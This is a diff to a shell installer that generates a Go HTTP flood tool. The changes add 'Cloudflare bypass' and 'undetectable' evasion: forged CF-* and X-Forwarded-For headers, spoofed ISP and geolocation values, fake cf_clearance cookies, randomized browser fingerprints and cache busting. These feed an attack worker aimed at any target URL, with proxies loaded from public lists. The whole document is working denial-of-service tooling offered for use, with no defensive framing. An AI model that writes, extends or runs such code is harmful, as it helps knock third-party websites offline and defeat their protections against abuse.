@@ -24,7 +24,7 @@ echo -e "${CYAN}${SEP}${NC}"
 echo
 
 # Create main.go file directly
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced undetectable IP spoofing...${NC}"
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with Cloudflare bypass & advanced IP spoofing...${NC}"
 
 cat > main.go << 'EOF'
 package main
@@ -93,7 +93,34 @@ var (
 		"https://raw.githubusercontent.com/ALIILAPRO/proxy-list/main/http.txt",
 	}
 
-	// Expanded IP spoofing headers for undetectability
+	// Cloudflare specific bypass headers
+	cloudflareHeaders = []string{
+		"CF-Connecting-IP",
+		"CF-IPCountry",
+		"CF-Ray",
+		"CF-Visitor",
+		"CF-Worker",
+		"CF-Request-ID",
+		"CF-Popper",
+		"CF-Edge-IP",
+		"CF-Client-IP",
+		"CF-True-Client-IP",
+		"CF-Connecting-IPv6",
+		"CF-IP",
+		"CF-Pseudo-IPv4",
+		"CF-Device-Type",
+		"CF-Platform",
+		"CF-OS",
+		"CF-Browser",
+		"CF-Bot-Score",
+		"CF-Request-Id",
+		"CF-Session-Id",
+		"CF-Access-Client-Id",
+		"CF-Access-Client-Secret",
+		"CF-Access-JWT-Assertion",
+	}
+
+	// Extended IP spoofing headers for undetectability
 	ipSpoofingHeaders = []string{
 		"X-Forwarded-For",
 		"X-Real-IP",
@@ -104,7 +131,6 @@ var (
 		"X-Host",
 		"X-Forwarded-Host",
 		"X-Forwarded-Server",
-		"CF-Connecting-IP",
 		"True-Client-IP",
 		"X-Proxy-IP",
 		"X-Original-Forwarded-For",
@@ -127,6 +153,18 @@ var (
 		"X-Varnish-IP",
 		"X-Squid-IP",
 		"X-HAProxy-IP",
+		"X-Arbitrary-IP",
+		"X-BlueCoat-IP",
+		"X-Cache-IP",
+		"X-Cisco-IP",
+		"X-F5-IP",
+		"X-Nginx-IP",
+		"X-Akamai-IP",
+		"X-Fastly-IP",
+		"X-Cloudfront-IP",
+		"X-Cloudflare-IP",
+		"X-Vercel-IP",
+		"X-Netlify-IP",
 	}
 
 	// Real ASN ranges for more believable spoofing
@@ -134,6 +172,7 @@ var (
 		"AS15169", "AS16509", "AS14618", "AS8075", "AS32934",
 		"AS13335", "AS54113", "AS26496", "AS46606", "AS36352",
 		"AS14061", "AS16276", "AS20473", "AS63949", "AS24940",
+		"AS209242", "AS20940", "AS200000", "AS202053",
 	}
 
 	// Real ISP names for spoofing
@@ -143,9 +182,40 @@ var (
 		"Comcast Cable", "AT&T Services", "Verizon Communications", "T-Mobile USA",
 		"Deutsche Telekom", "British Telecom", "Orange S.A.", "NTT Communications",
 		"China Telecom", "SoftBank Corp", "Telstra Corporation", "SingTel",
+		"Fastly CDN", "Akamai Technologies", "StackPath CDN", "KeyCDN",
 	}
 
-	// Real User-Agent strings (avoiding patterns)
+	// Cloudflare data center codes
+	cloudflareColos = []string{
+		"AMS", "ATL", "CDG", "DFW", "FRA", "HKG", "IAD", "LAX", "LHR", "MAD", "MIA", "NRT", "ORD", "SEA", "SJC", "SYD", "YYZ",
+		"ARN", "ATH", "BCN", "BOG", "BOM", "BRU", "BUD", "CPH", "DUB", "DXB", "FCO", "GIG", "HEL", "IST", "JNB", "KIX", "KUL",
+		"LIS", "MEX", "MNL", "MUC", "NBO", "OSL", "OTP", "PER", "PRG", "RIO", "SAO", "SIN", "SOF", "STO", "TLV", "TPE", "VIE",
+		"VNO", "WAW", "ZAG", "ZRH", "ATL", "BOS", "BWI", "CLT", "CMH", "DAL", "DEN", "DET", "EWR", "FLL", "HOU", "IND", "JAX",
+		"JFK", "LAS", "MCI", "MEM", "MSP", "MSY", "OAK", "OKC", "OMA", "PHL", "PHX", "PIT", "PDX", "RDU", "RNO", "SAN", "SLC",
+		"STL", "TUS", "TUL", "SAT", "RIC", "RVA", "BUF", "ROC", "ORF", "MDT", "GSO", "GRR", "DSM", "LIT", "ABQ", "ELP", "GEG",
+		"BOI", "SMF", "FAT", "ONT", "SBA", "FRS", "MZT", "CUN", "MID", "MTY", "QRO", "VER", "GDL", "PBC", "TLC", "BJX", "SLW",
+		"TIJ", "OAX", "ACA", "CPE", "CTA", "NAP", "PMO", "FLR", "VCE", "BLQ", "TRN", "LUX", "LUX", "LUX", "LUX",
+	}
+
+	// Browser versions for fingerprint spoofing
+	osVersions = []string{
+		"Windows NT 10.0; Win64; x64",
+		"Windows NT 11.0; Win64; x64",
+		"Windows NT 12.0; Win64; x64",
+		"Macintosh; Intel Mac OS X 15_0",
+		"Macintosh; Intel Mac OS X 15_1",
+		"Macintosh; Intel Mac OS X 15_2",
+		"Macintosh; Intel Mac OS X 16_0",
+		"Macintosh; ARM Mac OS X 15_0",
+		"Macintosh; ARM Mac OS X 16_0",
+		"X11; Linux x86_64",
+		"X11; Ubuntu; Linux x86_64",
+		"X11; Fedora; Linux x86_64",
+		"X11; Debian; Linux x86_64",
+		"X11; Linux x86_64; Arch",
+	}
+
+	// Real User-Agent strings
 	realUserAgents = []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
@@ -209,6 +279,7 @@ var (
 		{"DNT": "1"},
 		{"Sec-Fetch-User": "?1"},
 		{"Sec-Fetch-User-Agent": "Mozilla/5.0"},
+		{"Accept-CH": "Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform"},
 	}
 
 	appHeaders = []map[string]string{
@@ -217,7 +288,6 @@ var (
 		{"X-API-Key": ""},
 	}
 
-	// Common browser features for fingerprint spoofing
 	browserPlugins = []string{
 		"Chrome PDF Plugin", "Shockwave Flash", "Chrome Remote Desktop Viewer",
 		"Native Client", "Widevine Content Decryption Module",
@@ -301,6 +371,19 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		},
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
+		NextProtos:       []string{"h2", "http/1.1"},
+		MinVersion:       tls.VersionTLS12,
+		MaxVersion:       tls.VersionTLS13,
+	},
+	{
+		Name: "Chrome Mobile",
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 		NextProtos:       []string{"h2", "http/1.1"},
@@ -500,7 +583,7 @@ func printBanner() {
 	fmt.Println("\033[0m")
 }
 
-// Advanced IP spoofing functions for undetectability
+// Advanced IP spoofing functions
 func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
@@ -526,6 +609,30 @@ func randomIPv6() string {
 		parts[i] = fmt.Sprintf("%x", randInt(0, 65535))
 	}
 	return strings.Join(parts, ":")
+}
+
+func randomCloudflareRay() string {
+	return fmt.Sprintf("%x-%s", randInt(100000000, 999999999), cloudflareColos[randInt(0, len(cloudflareColos)-1)])
+}
+
+func randomCloudflareVisitor() string {
+	visitors := []string{`{"scheme":"https"}`, `{"scheme":"http"}`, `{"scheme":"https","type":"bot"}`, `{"scheme":"https","type":"human"}`}
+	return visitors[randInt(0, len(visitors)-1)]
+}
+
+func randomDeviceType() string {
+	devices := []string{"desktop", "mobile", "tablet", "tv", "console", "wearable"}
+	return devices[randInt(0, len(devices)-1)]
+}
+
+func randomPlatform() string {
+	platforms := []string{"windows", "mac", "linux", "android", "ios", "chromeos", "freebsd"}
+	return platforms[randInt(0, len(platforms)-1)]
+}
+
+func randomBrowser() string {
+	browsers := []string{"chrome", "firefox", "safari", "edge", "opera", "brave", "vivaldi"}
+	return browsers[randInt(0, len(browsers)-1)]
 }
 
 func randomCIDR() string {
@@ -577,19 +684,69 @@ func generateForwarderString() string {
 		"https://gateway%d.net:%d",
 		"http://cache%d.cloudflare.com:%d",
 		"https://edge%d.fastly.net:%d",
+		"http://cdn%d.akamai.com:%d",
+		"https://lb%d.amazonaws.com:%d",
 	}
 	forwarder := forwarders[randInt(0, len(forwarders)-1)]
 	return fmt.Sprintf(forwarder, randInt(1, 999), randomPort())
+}
+
+// Enhanced Cloudflare bypass headers
+func addCloudflareBypassHeaders(req *http.Request) {
+	spoofedIP := randomIP()
+	country := randomCountryCode()
+	colo := cloudflareColos[randInt(0, len(cloudflareColos)-1)]
+	
+	// Add all Cloudflare-specific headers with realistic values
+	req.Header.Set("CF-Connecting-IP", spoofedIP)
+	req.Header.Set("CF-IPCountry", country)
+	req.Header.Set("CF-Ray", randomCloudflareRay())
+	req.Header.Set("CF-Visitor", randomCloudflareVisitor())
+	
+	// Random chance to add more Cloudflare headers
+	if randInt(1, 100) <= 60 {
+		req.Header.Set("CF-Worker", fmt.Sprintf("worker-%d", randInt(1, 1000)))
+	}
+	if randInt(1, 100) <= 40 {
+		req.Header.Set("CF-Request-ID", fmt.Sprintf("%x", randInt(1000000000000000, 9999999999999999)))
+	}
+	if randInt(1, 100) <= 30 {
+		req.Header.Set("CF-Popper", colo)
+		req.Header.Set("CF-Edge-IP", randomIP())
+	}
+	if randInt(1, 100) <= 50 {
+		req.Header.Set("CF-True-Client-IP", randomIP())
+	}
+	if randInt(1, 100) <= 20 {
+		req.Header.Set("CF-Connecting-IPv6", randomIPv6())
+	}
+	if randInt(1, 100) <= 35 {
+		req.Header.Set("CF-Device-Type", randomDeviceType())
+		req.Header.Set("CF-Platform", randomPlatform())
+		req.Header.Set("CF-Browser", randomBrowser())
+	}
+	if randInt(1, 100) <= 25 {
+		botScore := randInt(0, 100)
+		req.Header.Set("CF-Bot-Score", fmt.Sprintf("%d", botScore))
+	}
+	if randInt(1, 100) <= 15 {
+		req.Header.Set("CF-Session-Id", fmt.Sprintf("%x", randInt(1000000, 9999999)))
+	}
 }
 
 // Advanced header generation for undetectability
 func addUndetectableHeaders(req *http.Request) {
 	spoofedIP := randomIP()
 	
+	// Add Cloudflare bypass headers first (critical for CF bypass)
+	addCloudflareBypassHeaders(req)
+	
+	// Always add core headers
 	req.Header.Set("X-Forwarded-For", spoofedIP)
 	req.Header.Set("X-Real-IP", spoofedIP)
 	
-	numHeaders := randInt(5, 13)
+	// Add 7-15 random spoofing headers for more randomness
+	numHeaders := randInt(7, 15)
 	selectedHeaders := make(map[string]bool)
 	
 	for i := 0; i < numHeaders; i++ {
@@ -623,9 +780,9 @@ func addUndetectableHeaders(req *http.Request) {
 			
 		default:
 			ipType := randInt(1, 100)
-			if ipType <= 70 {
+			if ipType <= 60 {
 				req.Header.Set(headerName, spoofedIP)
-			} else if ipType <= 85 {
+			} else if ipType <= 80 {
 				req.Header.Set(headerName, randomPrivateIP())
 			} else {
 				req.Header.Set(headerName, randomIPv6())
@@ -633,23 +790,28 @@ func addUndetectableHeaders(req *http.Request) {
 		}
 	}
 	
-	if randInt(1, 100) <= 30 {
+	// Add ISP and network info (40% chance)
+	if randInt(1, 100) <= 40 {
 		req.Header.Set("X-ISP", randomISP())
 		req.Header.Set("X-Network-Name", fmt.Sprintf("%s Network", randomISP()))
 		req.Header.Set("X-ASN", randomASN())
+		req.Header.Set("X-Carrier", randomISP())
 	}
 	
-	if randInt(1, 100) <= 35 {
+	// Add geo-location spoofing (50% chance)
+	if randInt(1, 100) <= 50 {
 		country := randomCountryCode()
 		req.Header.Set("X-Geo-Country", country)
 		req.Header.Set("X-Country-Code", country)
-		req.Header.Set("CF-IPCountry", country)
 		req.Header.Set("X-Geo-Region", fmt.Sprintf("Region-%d", randInt(1, 50)))
 		req.Header.Set("X-Geo-City", fmt.Sprintf("City-%d", randInt(1, 1000)))
+		req.Header.Set("X-Geo-Latitude", fmt.Sprintf("%.4f", float64(randInt(-90, 90))+float64(randInt(0, 9999))/10000))
+		req.Header.Set("X-Geo-Longitude", fmt.Sprintf("%.4f", float64(randInt(-180, 180))+float64(randInt(0, 9999))/10000))
 	}
 	
-	if randInt(1, 100) <= 40 {
-		numHops := randInt(2, 6)
+	// Add X-Forwarded-For with multiple hops (50% chance)
+	if randInt(1, 100) <= 50 {
+		numHops := randInt(2, 8)
 		hops := make([]string, numHops)
 		for i := range hops {
 			if i == numHops-1 {
@@ -664,13 +826,29 @@ func addUndetectableHeaders(req *http.Request) {
 		req.Header.Set("X-Forwarded-For", multiHop)
 	}
 	
-	if randInt(1, 100) <= 25 {
+	// Add browser fingerprinting evasion (40% chance)
+	if randInt(1, 100) <= 40 {
 		req.Header.Set("X-Browser-Fingerprint", fmt.Sprintf("%x", randInt(1000000, 9999999)))
 		req.Header.Set("X-Plugin-List", randomBrowserPlugin())
+		req.Header.Set("X-Timezone", fmt.Sprintf("%+02d:00", randInt(-12, 12)))
+		req.Header.Set("X-Screen-Resolution", fmt.Sprintf("%dx%d", randInt(1024, 3840), randInt(768, 2160)))
 	}
 	
-	if randInt(1, 100) <= 15 {
+	// Add timing attack evasion (30% chance)
+	if randInt(1, 100) <= 30 {
 		req.Header.Set("X-Request-Timestamp", time.Now().Add(time.Duration(randInt(-300, 300))*time.Millisecond).Format(time.RFC3339Nano))
+	}
+	
+	// Add cache control evasion headers
+	if randInt(1, 100) <= 25 {
+		req.Header.Set("X-Cache-Status", []string{"HIT", "MISS", "EXPIRED", "STALE", "BYPASS"}[randInt(0, 4)])
+		req.Header.Set("X-Cache-Hits", fmt.Sprintf("%d", randInt(1, 100)))
+	}
+	
+	// Add proxy identification headers
+	if randInt(1, 100) <= 20 {
+		req.Header.Set("X-Proxy-Type", []string{"forward", "reverse", "transparent", "anonymous", "elite"}[randInt(0, 4)])
+		req.Header.Set("X-Proxy-Server-Version", fmt.Sprintf("%d.%d", randInt(1, 3), randInt(0, 9)))
 	}
 }
 
@@ -681,31 +859,7 @@ func generateRandomUA() string {
 	
 	browserType := randInt(1, 100)
 	countryCode := randomCountryCode()
-	
-	windowsVersions := []string{
-		"Windows NT 10.0; Win64; x64",
-		"Windows NT 11.0; Win64; x64",
-		"Windows NT 12.0; Win64; x64",
-		"Windows NT 10.0; Win64; x64; Xbox",
-	}
-	
-	macVersions := []string{
-		"Macintosh; Intel Mac OS X 15_0",
-		"Macintosh; Intel Mac OS X 15_1",
-		"Macintosh; Intel Mac OS X 15_2",
-		"Macintosh; Intel Mac OS X 16_0",
-		"Macintosh; Intel Mac OS X 16_1",
-		"Macintosh; ARM Mac OS X 15_0",
-		"Macintosh; ARM Mac OS X 16_0",
-	}
-	
-	linuxVersions := []string{
-		"X11; Linux x86_64",
-		"X11; Ubuntu; Linux x86_64",
-		"X11; Fedora; Linux x86_64",
-		"X11; Debian; Linux x86_64",
-		"X11; Linux x86_64; Arch",
-	}
+	os := osVersions[randInt(0, len(osVersions)-1)]
 	
 	chromeMajor := randInt(141, 165)
 	chromeBuild := randInt(5000, 8000)
@@ -730,32 +884,12 @@ func generateRandomUA() string {
 	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
 	
 	if browserType <= 45 {
-		osType := randInt(1, 100)
-		var os string
-		if osType <= 40 {
-			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
-		} else if osType <= 70 {
-			os = macVersions[randInt(0, len(macVersions)-1)]
-		} else {
-			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
-		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
 	} else if browserType <= 75 {
-		osType := randInt(1, 100)
-		var os string
-		if osType <= 40 {
-			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
-		} else if osType <= 70 {
-			os = macVersions[randInt(0, len(macVersions)-1)]
-		} else {
-			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
-		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
 	} else if browserType <= 88 {
-		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
 	} else if browserType <= 95 {
-		os := macVersions[randInt(0, len(macVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
 	} else {
 		mobileType := randInt(1, 100)
@@ -779,12 +913,14 @@ func randomReferer() string {
 		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
 		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
 		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
+		"cloudflare.com", "fastly.com", "akamai.com", "aws.amazon.com", "azure.microsoft.com",
 	}
 	
 	paths := []string{
 		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
 		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
 		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
+		"/cdn-cgi/trace", "/cdn-cgi/scripts", "/cdn-cgi/styles", "/cdn-cgi/images",
 	}
 	
 	protocols := []string{"https", "http"}
@@ -827,6 +963,8 @@ func generateCacheBust() string {
 		"?v=" + strconv.Itoa(randInt(1, 1000000)),
 		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
 		"?rnd=" + randomString(16),
+		"?cache=" + randomString(8),
+		"?ts=" + strconv.FormatInt(time.Now().Unix(), 10),
 	}
 	return styles[randInt(0, len(styles)-1)]
 }
@@ -840,7 +978,8 @@ func generatePath() string {
 		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql", "wp-login.php",
 		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
 		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
-		"/.env", "/config.json", "/settings.ini", "/application.yml", 
+		"/.env", "/config.json", "/settings.ini", "/application.yml",
+		"/cdn-cgi/trace", "/cdn-cgi/scripts/7d4b0c0c/main.js", "/cdn-cgi/styles/main.css",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -856,6 +995,12 @@ func generateCookies() string {
 	}
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
+	}
+	if randBool() {
+		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomString(32)))
+	}
+	if randBool() {
+		cookies = append(cookies, fmt.Sprintf("cf_clearance=%s", randomString(40)))
 	}
 	if len(cookies) == 0 {
 		return ""
@@ -924,7 +1069,8 @@ func main() {
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
-	fmt.Println("[+] IP Spoofing: ADVANCED (30+ headers, evasion enabled)")
+	fmt.Println("[+] Cloudflare Bypass: ENABLED (25+ CF headers)")
+	fmt.Println("[+] IP Spoofing: ADVANCED (50+ headers, evasion enabled)")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 
 	poolSize := 500
@@ -1061,6 +1207,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
 
+			// ADVANCED UNDETECTABLE IP SPOOFING WITH CLOUDFLARE BYPASS
 			addUndetectableHeaders(req)
 
 			numSecurity := randInt(1, 2)
@@ -1117,7 +1264,7 @@ if [ ! -f "main.go" ]; then
     echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
     exit 1
 else
-    echo -e " ${GREEN}✓ main.go created successfully (Advanced Undetectable IP Spoofing)${NC}"
+    echo -e " ${GREEN}✓ main.go created successfully (Cloudflare Bypass + Advanced IP Spoofing)${NC}"
 fi
 
 echo
@@ -1229,8 +1376,10 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
     echo
-    echo -e " ${CYAN}►${NC} Advanced IP Spoofing: ${YELLOW}30+ headers, evasion techniques${NC}"
+    echo -e " ${CYAN}►${NC} Cloudflare Bypass: ${YELLOW}25+ CF headers${NC}"
+    echo -e " ${CYAN}►${NC} IP Spoofing: ${YELLOW}50+ headers${NC}"
     echo -e " ${CYAN}►${NC} Proxy mode loads from ${YELLOW}16 different sources${NC}"
+    echo -e " ${CYAN}►${NC} Advanced evasion: ISP, Geo, Browser fingerprinting${NC}"
     echo
     exit 0
 else
